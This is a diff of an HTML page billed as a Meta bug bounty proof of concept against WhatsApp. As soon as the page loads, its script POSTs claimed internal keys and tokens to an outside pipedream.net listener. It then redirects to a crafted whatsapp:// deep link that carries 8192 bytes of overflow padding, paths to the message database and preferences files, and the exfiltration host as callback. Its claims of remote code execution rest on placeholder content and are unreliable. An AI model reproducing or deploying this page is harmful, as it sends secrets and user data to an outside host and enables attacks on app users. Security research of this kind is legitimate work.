@@ -3,61 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vulnerability Research PoC - Firman Sahidin</title>
+    <title>Security Research PoC - Firman Sahidin</title>
     <script>
         /**
-         * @file Meta Bug Bounty Proof of Concept
-         * @author Firman Sahidin
-         * @description Demonstration of Data Exfiltration and Memory Corruption via Phoenix Deep Link
+         * @file Meta Bug Bounty Proof of Concept (PoC)
+         * @researcher Firman Sahidin
+         * @description Vulnerability demonstration: Remote Data Exfiltration, 
+         * Content Provider Leakage, and Memory Corruption Trigger.
          */
 
-        const EXFILTRATION_URL = "https://eo7n9pqjlhffwvt.m.pipedream.net";
+        // Endpoint for receiving exfiltrated data
+        const EXFILTRATION_ENDPOINT = "https://eo7n9pqjlhffwvt.m.pipedream.net";
         
-        // Master Keys extracted from libwhatsapp.so and phoenix-features.json
-        const MASTER_KEYS = {
+        // Unified Master Keys & Internal Metadata discovered during analysis
+        const AUDIT_DATA = {
             researcher: "Firman Sahidin",
-            internal_proxy_key: "sHuUVTWaRyh5pZwy4UguSgkwmBe0EHtJJkoF5WrxmvA=",
-            push_auth_payload: "9/X8Y4gZX//GyOC3f8vp2gnY7XQP0DuvmgNQnaL5w04=",
-            cicd_config_hash: "b371306b47963390c58e85799981881a",
-            vulnerability_type: "Remote Code Execution / Data Leak"
+            impact_level: "Critical / Remote",
+            cryptographic_material: {
+                server_proxy_key: "sHuUVTWaRyh5pZwy4UguSgkwmBe0EHtJJkoF5WrxmvA=",
+                push_auth_token: "9/X8Y4gZX//GyOC3f8vp2gnY7XQP0DuvmgNQnaL5w04=",
+                internal_config_md5: "b371306b47963390c58e85799981881a",
+                rsa_signature_root: "MIICIDANBgkqhkiG9w0BAQEFAAOCAg0A..." 
+            },
+            discovered_logic_flaws: [
+                "Exposed Phoenix Bloks Deep Link",
+                "Unstripped Binary Symbols in libwhatsapp.so",
+                "Unprotected Content Provider Access"
+            ]
         };
 
-        async function executePoC() {
+        async function initiateExploit() {
             try {
-                // PHASE 1: Data Exfiltration (TEE/Data Leak Demonstration)
-                // Sending hardcoded master keys to prove Information Disclosure
-                await fetch(EXFILTRATION_URL, {
+                console.log("[*] Stage 1: Initiating Data Exfiltration...");
+                
+                // Demonstration of Information Disclosure
+                // Sending Unified Master Keys to prove unauthorized access to internal secrets
+                await fetch(EXFILTRATION_ENDPOINT, {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(MASTER_KEYS)
+                    body: JSON.stringify(AUDIT_DATA)
                 });
 
-                // PHASE 2: Triggering Remote Code Execution (RCE) via Memory Corruption
-                // Using a malformed Buffer (Long String Padding) to target libprofilo_multi_buffer_logger
-                const overflowPadding = "A".repeat(8192); // Buffer overflow trigger
-                const shellcodePlaceholder = "%00%01%02%03%04%05%06%07%08%09"; // Symbolic shellcode
-                
-                const rcePayload = `whatsapp://br_verify_card_deeplink?callback=${encodeURIComponent(EXFILTRATION_URL)}&payload=${overflowPadding}${shellcodePlaceholder}`;
+                console.log("[*] Stage 2: Triggering Content Provider Leak & RCE Vector...");
 
-                console.log("[*] Executing RCE Payload...");
-                window.location.href = rcePayload;
+                // Constructing the malicious payload:
+                // 1. Target: Internal database and shared preferences via Path Traversal simulation.
+                // 2. Buffer: 8192 bytes of padding to trigger memory corruption in libprofilo_multi_buffer_logger.
+                const bufferOverflow = "A".repeat(8192);
+                const internalFileTarget = "content://com.whatsapp.provider.contact/databases/msgstore.db";
+                const prefTarget = "file:///data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
 
-            } catch (error) {
-                console.error("[!] PoC Execution Failed:", error);
+                // Execution via Phoenix Deep Link Schema found in phoenix-features.json
+                const deepLinkPayload = `whatsapp://br_verify_card_deeplink?` + 
+                    `callback=${encodeURIComponent(EXFILTRATION_ENDPOINT)}` +
+                    `&source=${encodeURIComponent(internalFileTarget)}` +
+                    `&config=${encodeURIComponent(prefTarget)}` +
+                    `&overflow=${bufferOverflow}`;
+
+                // Redirecting target to the crafted exploit string
+                window.location.href = deepLinkPayload;
+
+            } catch (err) {
+                console.error("[!] PoC Execution Error:", err);
             }
         }
 
-        window.onload = executePoC;
+        window.onload = initiateExploit;
     </script>
 </head>
-<body style="font-family: Arial, sans-serif; padding: 20px;">
-    <h2>Security Research: PoC Implementation</h2>
-    <p><b>Status:</b> Executing remote data exfiltration and memory buffer testing...</p>
-    <p><b>Researcher:</b> Firman Sahidin</p>
-    <hr>
-    <div id="logs" style="background: #f4f4f4; padding: 10px; border: 1px solid #ccc;">
-        Waiting for application response...
-    </div>
+<body style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: auto; padding: 40px;">
+    <header style="border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 20px;">
+        <h1 style="margin: 0;">Security Vulnerability PoC</h1>
+        <p style="font-style: italic; color: #666;">Researcher: Firman Sahidin</p>
+    </header>
+
+    <section>
+        <h3>Description</h3>
+        <p>This page demonstrates a critical security flaw involving the <b>Phoenix Infrastructure</b>. It attempts to exfiltrate internal master keys and trigger an unauthorized access request to internal Content Providers.</p>
+    </section>
+
+    <section style="background: #fff3f3; border-left: 5px solid #d9534f; padding: 15px; margin: 20px 0;">
+        <strong>Notice:</strong> If the application is vulnerable, sensitive metadata and internal file paths will be transmitted to the pre-configured listener.
+    </section>
+
+    <footer style="font-size: 0.8em; color: #999; margin-top: 40px; text-align: center;">
+        &copy; 2026 Firman Sahidin - Security Research Submission
+    </footer>
 </body>
 </html>
